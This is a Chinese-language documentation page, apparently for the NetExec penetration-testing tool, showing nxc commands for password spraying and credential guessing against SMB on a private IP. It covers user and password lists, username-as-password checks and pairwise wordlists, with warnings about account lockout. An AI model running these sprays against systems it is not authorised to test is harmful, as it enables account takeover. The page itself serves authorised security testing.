---
description: 使用 NetExec 进行密码喷洒攻击
---

# 密码喷洒攻击

### 使用Username/Password列表

你可以使用多个用户名或密码，用空格分隔名称/密码。

```
nxc smb 192.168.1.101 -u user1 user2 user3 -p Summer18
nxc smb 192.168.1.101 -u user1 -p password1 password2 password3
```

nxc 接受用户名和密码的 txt 文件。每行一个user/password。注意账户锁定！

```
nxc smb 192.168.1.101 -u /path/to/users.txt -p Summer18
nxc smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt
```

{% hint style="warning" %}
默认情况下，nxc 会在找到一个有效登录后退出。使用 **--continue-on-success** 标志，它会在找到有效密码后继续喷洒。这在对大量用户列表使用单个密码进行喷洒时很有用。这与命令执行不兼容。
{% endhint %}

使用示例：

```
nxc smb 192.168.1.101 -u /path/to/users.txt -p Summer18 --continue-on-success
```

### 使用词表检查"username == password"

```
nxc smb 192.168.1.101 -u user.txt -p user.txt --no-bruteforce --continue-on-success
```

### 使用词表检查多个usernames/passwords

```
nxc smb 192.168.1.101 -u user.txt -p password.txt
```

结果将是：

* user1 => password1
* user1 => password2
* user2 => password1
* user2 => password2

{% hint style="danger" %}
使用此技术时要小心不要锁定账户
{% endhint %}

### 使用词表检查一个登录对应一个密码

{% hint style="success" %}
这种情况下不可能进行暴力破解，因为 1 个用户 = 1 个密码
{% endhint %}

```
nxc smb 192.168.1.101 -u user.txt -p password.txt --no-bruteforce --continue-on-success
```

结果将是：

* user1 => password1
* user2 => password2

{% hint style="danger" %}
使用 `--no-bruteforce` 选项时避免使用 IP 范围或列表
{% endhint %}
